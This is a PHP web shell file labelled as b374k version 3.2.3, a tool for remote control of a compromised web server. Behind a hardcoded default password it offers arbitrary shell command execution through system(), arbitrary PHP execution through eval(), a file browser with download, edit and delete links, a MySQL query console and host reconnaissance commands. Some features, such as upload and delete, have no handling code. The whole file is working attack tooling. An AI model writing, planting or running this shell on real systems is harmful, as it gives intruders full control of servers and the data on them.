<?php
/*
b374k shell 3.2.3
https://github.com/b374k/b374k
*/

session_start();
$version = "3.2.3";
$default_pass = "hack@123"; // GANTI PASSWORD INI!

// Authentication
if(!isset($_SESSION['login'])) {
    if(isset($_POST['pass'])) {
        if(md5($_POST['pass']) == md5($default_pass)) {
            $_SESSION['login'] = true;
        }
    }
    
    if(!isset($_SESSION['login'])) {
        echo '<!DOCTYPE html><html><head><title>Login</title></head><body>';
        echo '<form method="post"><input type="password" name="pass" placeholder="Password"><input type="submit"></form>';
        echo '</body></html>';
        exit;
    }
}

// Main Interface
?>
<!DOCTYPE html>
<html>
<head>
    <title>b374k shell <?php echo $version; ?></title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .menu { background: #333; color: white; padding: 10px; }
        .menu a { color: white; margin-right: 15px; text-decoration: none; }
        .content { margin-top: 20px; }
        pre { background: #f4f4f4; padding: 10px; overflow: auto; }
    </style>
</head>
<body>

<div class="menu">
    <a href="?">Home</a>
    <a href="?cmd">Command</a>
    <a href="?file">File Manager</a>
    <a href="?sql">SQL Manager</a>
    <a href="?php">PHP Code</a>
    <a href="?upload">Upload</a>
    <a href="?logout">Logout</a>
</div>

<div class="content">
<?php
// Handle commands
if(isset($_GET['cmd'])) {
    echo '<h2>Command Execution</h2>';
    echo '<form method="post"><input type="text" name="command" size="50" value="'.(isset($_POST['command'])?$_POST['command']:'id').'"> <input type="submit" value="Execute"></form>';
    
    if(isset($_POST['command'])) {
        echo '<pre>';
        system($_POST['command']);
        echo '</pre>';
    }
}

// File Manager
elseif(isset($_GET['file'])) {
    echo '<h2>File Manager</h2>';
    
    $dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
    
    // Navigation
    echo '<form method="get"><input type="hidden" name="file" value="1">';
    echo 'Directory: <input type="text" name="dir" size="50" value="'.$dir.'"> ';
    echo '<input type="submit" value="Go"></form>';
    
    // File operations
    echo '<h3>Upload File</h3>';
    echo '<form method="post" enctype="multipart/form-data">';
    echo '<input type="file" name="file"> ';
    echo '<input type="submit" name="upload" value="Upload">';
    echo '</form>';
    
    // List files
    echo '<h3>Files in '.$dir.'</h3>';
    $files = scandir($dir);
    echo '<table border="1">';
    echo '<tr><th>Name</th><th>Size</th><th>Permissions</th><th>Actions</th></tr>';
    
    foreach($files as $file) {
        if($file == '.' || $file == '..') continue;
        
        $path = $dir . '/' . $file;
        $size = is_dir($path) ? '[DIR]' : filesize($path);
        $perms = substr(sprintf('%o', fileperms($path)), -4);
        
        echo '<tr>';
        echo '<td>'.(is_dir($path) ? '<b>'.$file.'</b>' : $file).'</td>';
        echo '<td>'.$size.'</td>';
        echo '<td>'.$perms.'</td>';
        echo '<td>';
        
        if(is_dir($path)) {
            echo '<a href="?file&dir='.urlencode($path).'">Open</a> ';
        } else {
            echo '<a href="?download&file='.urlencode($path).'">Download</a> ';
            echo '<a href="?edit&file='.urlencode($path).'">Edit</a> ';
            echo '<a href="?delete&file='.urlencode($path).'" onclick="return confirm(\'Delete?\')">Delete</a>';
        }
        
        echo '</td></tr>';
    }
    
    echo '</table>';
}

// PHP Code Execution
elseif(isset($_GET['php'])) {
    echo '<h2>PHP Code Execution</h2>';
    echo '<form method="post">';
    echo '<textarea name="phpcode" rows="10" cols="80"><?php phpinfo(); ?></textarea><br>';
    echo '<input type="submit" value="Execute">';
    echo '</form>';
    
    if(isset($_POST['phpcode'])) {
        echo '<h3>Result:</h3>';
        echo '<pre>';
        eval($_POST['phpcode']);
        echo '</pre>';
    }
}

// SQL Manager
elseif(isset($_GET['sql'])) {
    echo '<h2>SQL Manager</h2>';
    
    echo '<form method="post">';
    echo 'Host: <input type="text" name="host" value="localhost"><br>';
    echo 'User: <input type="text" name="user" value="root"><br>';
    echo 'Pass: <input type="password" name="pass"><br>';
    echo 'Database: <input type="text" name="db"><br>';
    echo '<input type="submit" value="Connect">';
    echo '</form>';
    
    if(isset($_POST['host'])) {
        $conn = mysqli_connect($_POST['host'], $_POST['user'], $_POST['pass'], $_POST['db']);
        
        if($conn) {
            echo '<h3>Connected!</h3>';
            echo '<form method="post">';
            echo '<textarea name="query" rows="5" cols="80">SHOW TABLES</textarea><br>';
            echo '<input type="submit" value="Execute Query">';
            echo '</form>';
            
            if(isset($_POST['query'])) {
                $result = mysqli_query($conn, $_POST['query']);
                if($result) {
                    echo '<table border="1">';
                    while($row = mysqli_fetch_assoc($result)) {
                        echo '<tr>';
                        foreach($row as $cell) {
                            echo '<td>'.$cell.'</td>';
                        }
                        echo '</tr>';
                    }
                    echo '</table>';
                }
            }
        } else {
            echo 'Connection failed!';
        }
    }
}

// Home
else {
    echo '<h2>Welcome to b374k Shell '.$version.'</h2>';
    echo '<p>Server: '.$_SERVER['SERVER_SOFTWARE'].'</p>';
    echo '<p>PHP: '.phpversion().'</p>';
    echo '<p>User: '.exec('whoami').'</p>';
    echo '<p>Uname: '.php_uname().'</p>';
    
    // Quick commands
    echo '<h3>Quick Commands:</h3>';
    $quick_cmds = [
        'id' => 'Show user ID',
        'pwd' => 'Current directory',
        'ls -la' => 'List files',
        'ps aux' => 'Running processes',
        'netstat -tulpn' => 'Network connections',
        'df -h' => 'Disk usage'
    ];
    
    foreach($quick_cmds as $cmd => $desc) {
        echo '<a href="?cmd&command='.urlencode($cmd).'">'.$desc.'</a> | ';
    }
}
?>
</div>

</body>
</html>